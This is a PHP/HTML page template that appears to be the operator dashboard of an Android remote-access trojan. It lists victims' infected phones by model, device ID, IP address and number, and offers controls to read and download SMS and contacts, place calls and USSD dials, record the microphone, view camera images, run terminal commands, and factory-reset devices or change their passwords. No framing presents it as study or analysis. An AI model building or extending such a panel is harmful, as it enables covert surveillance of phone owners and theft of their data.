<?php require_once __DIR__ . "/header.php"; ?>

<div class="container">
    <div class="page-title">
        <h3>Dashboard</h3>
    </div>
    <div class="box box-primary" style="height: 400px;overflow-y: auto;">
        <div class="box-body">
            <table width="100%" class="table table-hover" id="dataTables-example">
                <thead>
                    <tr>
                        <th>Model</th>
                        <th>Device-ID</th>
                        <th>IP Address</th>
                        <th>Device API</th>
                        <th>Phone</th>
                        <th></th>
                    </tr>
                </thead>
                <tbody class="victims-body"> 
                    <?php foreach($clients as $client): ?>
                      <tr>
                          <td><?= $client->getModel(); ?></td>
                          <td><?= $client->getDeviceID(); ?></td>
                          <td><?= $client->getIPAddress(); ?></td>
                          <td><?= $client->getDeviceAPI(); ?></td>
                          <td><?= $client->getPhone(); ?></td>
                          <td class="text-end">
                              <a target="_blank" href="/messages?client=<?= $client->getID(); ?>" id="btn-sms" class="btn btn-outline-danger btn-rounded"><i class="fas fa-sms"></i></a>
                              <a target="_blank" id="btn-phone" class="btn btn-outline-success btn-rounded"><i class="fas fa-phone"></i></a>
                              <a target="_blank" id="btn-settings" class="btn btn-outline-secondary btn-rounded"><i class="fas fa-cog"></i></a>
                              <a target="_blank" href="/images?client=<?= $client->getID(); ?>" id="btn-camera" class="btn btn-outline-primary btn-rounded"><i class="fas fa-camera"></i></a>
                              <a target="_blank" href="/recordings?client=<?= $client->getID(); ?>" id="btn-mic" class="btn btn-outline-info btn-rounded"><i class="fas fa-microphone"></i></a>
                              <a target="_blank" id="btn-terminal" class="btn btn-outline-dark btn-rounded"><i class="fas fa-terminal"></i></a>
                          </td>
                      </tr>  
                    <?php endforeach ?>
                </tbody>
            </table>

          
        </div>
    </div>
</div>

<div style="overflow-x:auto;width:100%;white-space: normal;height: 150px;" class="container dark-box">
    <div class="box-body log-class" style="font-family: 'Courier Prime', monospace;">
        
    </div>
</div>


<!-- Phone -->
<div class="modal fade" id="phoneModal" tabindex="-1" role="dialog" aria-labelledby="phoneModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="phone-modal-title" id="phoneModalLabel">Phone</h5>
          <button type="button" id="phone-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <div class="content">
            <div class="input-group mb-3">
              <input type="tel" name="" class="form-control" placeholder="e.g. *#0011#" aria-label="Dial USSD" aria-describedby="basic-addon2">
              <div class="input-group-append">
                <button style="background: #2196F3 !important;color: white" type="button" class="btn" id="modal-save">Dial</button>      
              </div>
            </div>
            <div class="input-group mb-3">
              <input type="tel" name="" class="form-control" placeholder="Phone number" aria-label="Phone number" aria-describedby="basic-addon2">
              <div class="input-group-append">
                <button style="background: #2196F3 !important;color: white" type="button" class="btn" id="modal-save">Call </button>      
              </div>
            </div>
            <div class="row">
              <div class="col-4">
                <input type="text" name="" class="form-control" placeholder="Name">
              </div>
              <div class="col-4">
                <input type="tel" name="" class="form-control" placeholder="Number">
              </div>
              <div class="col-4">
                <button style="background: #2196F3 !important;color: white" type="button" class="btn btn-primary col-12" id="modal-save">Write Contact</button> 
              </div>
            </div>
          </div>
        </div>
        <div class="modal-footer">
          <button style="background: #2196F3 !important;color: white" type="button" class="btn col-12" id="modal-save"><i class="fas fa-download"></i>  Download Contacts</button>
        </div>
      </div>
    </div>
</div>

<!-- SMS -->
<div class="modal fade" id="smsModal" tabindex="-1" role="dialog" aria-labelledby="smsModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="sms-modal-title" id="smsModalLabel">SMS</h5>
          <button type="button" id="sms-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <div class="content">
            <textarea style="resize: none;" name="message" id="" cols="30" rows="5" class="form-control" placeholder="Message..."></textarea>
            <br>
            <div class="input-group mb-3">
              <input type="tel" name="" class="form-control" placeholder="Phone number" aria-label="Phone number" aria-describedby="basic-addon2">
              <div class="input-group-append">
                <button style="background: #2196F3 !important;color: white" type="button" class="btn" id="modal-save">Send</button>      
              </div>
            </div>
            <button style="background: #2196F3 !important;color: white" type="button" class="btn col-12" id="modal-save"><i class="fas fa-download"></i>  Download Messages</button>
          </div>
        </div>
      </div>
    </div>
</div>

<!-- Settings -->
<div class="modal fade" id="settingsModal" tabindex="-1" role="dialog" aria-labelledby="settingsModal" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="settings-modal-title" id="settingsModalLabel">Settings</h5>
        <button type="button" id="settings-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="content">
          <div class="row">
            <div class="col-4">List Installed Apps</div>
            <div class="col-4">Factory Reset Device</div>
            <div class="col-4">Reboot Device</div>
          </div>
          <div class="row">
            <div class="col-4">Vibrate Phone</div>
            <div class="col-4">Change Wallpaper</div>
            <div class="col-4">Change Device Password</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Camera -->
<div class="modal fade" id="cameraModal" tabindex="-1" role="dialog" aria-labelledby="cameraModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="camera-modal-title" id="cameraModalLabel">Camera</h5>
          <button type="button" id="camera-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          ...
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-primary" id="modal-save">Save changes</button>
        </div>
      </div>
    </div>
</div>

<!-- Mic -->
<div class="modal fade" id="micModal" tabindex="-1" role="dialog" aria-labelledby="micModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="mic-modal-title" id="micModalLabel">Microphone</h5>
          <button type="button" id="mic-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <div class="content">
            <div class="input-group mb-3">
              <input type="number" name="" class="form-control" placeholder="Duration (seconds)" aria-label="Duration" aria-describedby="basic-addon2">
              <div class="input-group-append">
                <button style="background: #2196F3 !important;color: white" type="button" class="btn" id="modal-save">Reocrd</button>      
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
</div>

<!-- Terminal -->
<div class="modal fade" id="terminalModal" tabindex="-1" role="dialog" aria-labelledby="terminalModal" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="terminal-modal-title" id="terminalModalLabel">Terminal</h5>
          <button type="button" id="terminal-modal-dismiss" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="modal-body">
          <div class="content">
            <div style="overflow-x:auto;width:100%;white-space: normal;height: 150px;" class="container dark-box">
              <div class="box-body" style="font-family: 'Courier Prime', monospace;">
                <div class="row log-body">
                  <div class="col-12 text-light">
                    >
                  </div>
              </div>
              </div>
            </div>
            <div class="input-group mb-3">
              <input type="text" name="" class="form-control" placeholder="Enter command" aria-label="Enter command" aria-describedby="basic-addon2">
              <div class="input-group-append">
                <button style="background: #2196F3 !important;color: white" type="button" class="btn" id="modal-save">Send</button>      
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
</div>
<script src="/src/View/assets/js/initiate-datatables.js"></script>

<?php require_once __DIR__ . "/footer.php"; ?>